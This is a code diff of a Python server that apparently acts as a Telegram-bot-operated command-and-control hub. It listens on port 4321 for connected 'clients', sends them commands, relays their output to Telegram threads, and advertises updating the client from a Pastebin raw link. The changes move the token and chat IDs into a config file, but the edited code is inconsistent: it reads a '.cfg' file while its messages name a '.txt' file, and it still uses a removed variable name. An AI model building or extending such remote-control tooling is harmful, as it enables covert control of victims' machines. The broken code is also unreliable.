@@ -18,8 +18,41 @@ logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(m
                     handlers=[logging.StreamHandler(), logging.FileHandler('server.log', encoding='utf-8')])
 logger = logging.getLogger(__name__)
 
-TOKEN = "#type"
-GROUP_CHAT_ID = -#type
+
+DATA = {}
+# Чтение файла 'data_info.txt'
+try:
+    with open('data_info.cfg', 'r', encoding='utf-8') as file:
+        for line in file:
+            # Очистка строки от пробелов и символов переноса
+            line = line.strip()
+            # Если в строке есть '=', обрабатываем ее
+            if '=' in line:
+                key, value = line.split('=', 1)
+                DATA[key.strip()] = value.strip()
+except FileNotFoundError:
+    print("Критическая ошибка: Файл 'data_info.txt' не найден. Проверьте путь.")
+
+try:
+    TOKEN = DATA['TOKEN']
+    
+    # Блок для нескольких ID
+    # 1. Берем строку со всеми ID
+    ids_string = DATA['GROUP_CHAT_IDS']
+    
+    # 2. Разбиваем строку по запятой, убирая лишние пробелы с каждого ID
+    id_list_str = [id_str.strip() for id_str in ids_string.split(',')]
+    
+    # 3. Преобразуем список строк в список целых чисел (int)
+    GROUP_CHAT_IDS = [int(id_str) for id_str in id_list_str if id_str]
+    
+    print("Данные успешно загружены из data_info.txt.")
+except KeyError as e:
+    print(f"Ошибка: Ключ {e} не найден в файле 'data_info.txt'. Убедитесь, что используются ключи 'TOKEN' и 'GROUP_CHAT_IDS'.")
+except ValueError:
+    print("Ошибка: Одно или несколько значений в 'GROUP_CHAT_IDS' не являются корректными целыми числами.")
+
+
 bot = Bot(TOKEN)
 dp = Dispatcher()
 
@@ -27,7 +60,7 @@ clients = {}
 upload_requests = {}
 clients_lock = asyncio.Lock()
 HOST = '0.0.0.0'
-PORT = #type
+PORT = 4321
 HISTORY_FILE = "client_history.json"
 clients = {}
 CLIENT_HISTORY_CACHE = {}
@@ -50,7 +83,7 @@ async def find_client_by_thread(thread_id):
     except (ValueError, TypeError):
         return None, None, None
 
-    # 🔥 КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: Обязательно используйте clients_lock для безопасного чтения
+    # clients_lock для безопасного чтения
     async with clients_lock:
         # Проходим по всем активным клиентам
         for client_id, data in clients.items():
@@ -84,7 +117,7 @@ async def load_client_history():
         return {}
 
 async def save_client_history(history_data):
-    """Асинхронно сохраняет историю клиентов в файл."""
+    # Асинхронно сохраняет историю клиентов в файл.
     try:
         # Важно: делаем копию для модификации, чтобы не менять сам кэш!
         data_to_save = history_data.copy()
@@ -112,7 +145,7 @@ async def save_client_history(history_data):
 
 
 async def send_client_command(message: Message, command: str):
-    """Находит клиента и отправляет команду."""
+    # Находит клиента и отправляет команду
     
     thread_id = message.message_thread_id if message.message_thread_id else message.chat.id
     try:
@@ -347,7 +380,7 @@ async def handle_client(reader, writer):
                     continue
                 
                 # --------------------------------------------------------------------------------------
-                # БЛОК 2: СТАРЫЙ КОД (Обработка простого текстового результата)
+                # БЛОК 2(Обработка простого текстового результата)
                 if "result" in res:
                     await bot.send_message(GROUP_CHAT_ID, res["result"], message_thread_id=thread_id)
                     continue
@@ -534,7 +567,7 @@ async def handle_help(message: Message):
 <code>/update [pastebin raw]</code> - обновить версию на стороне клиента
 <code>/clients</code> - посмотреть активных клиентов и их историю
 
-    <i>ver beta v15</i>"""
+    <i>ver beta v16</i>"""
     await message.reply(help_text, parse_mode="HTML")
 
 async def get_client_status(client_id):
